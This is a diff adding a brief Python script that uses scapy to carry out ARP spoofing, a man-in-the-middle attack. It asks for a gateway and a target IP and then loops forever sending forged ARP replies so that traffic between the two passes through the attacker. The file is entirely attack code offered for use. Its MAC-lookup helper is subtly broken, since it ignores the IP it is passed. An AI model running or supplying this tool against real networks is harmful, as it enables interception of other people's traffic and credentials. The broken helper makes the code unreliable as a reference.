@@ -1,0 +1,36 @@
+"""
+ARP Spoofer scappy
+"""
+from scapy.all import *
+from scapy.layers.l2 import ARP, Ether
+
+req = ARP()
+broadcast = Ether()
+
+gateway = input("Gateway IP address, please ==> ")
+target = input("Target IP address, please ==> ")
+
+
+def mac_address_identifier(ip_address): #extract the mac address, ip and gateway of the target
+    response, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff"), retry=1, timeout=1)
+    for s, r in response:
+        return r[ARP].hwsrc
+    return None
+
+
+def arp_poisoner(gw_ip, gw_mac, target_ip, target_mac):
+    while True:
+        send(ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip))#kinda MIM where the source is the target who calls the gateway so we identify as the target
+        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip)) #identyfing as the gateway for the target
+
+
+def runner():
+    arp_poisoner(gateway, mac_address_identifier(gateway), target, mac_address_identifier(target))
+
+
+def main():
+    runner()
+
+
+if __name__ == "__main__":
+    main()
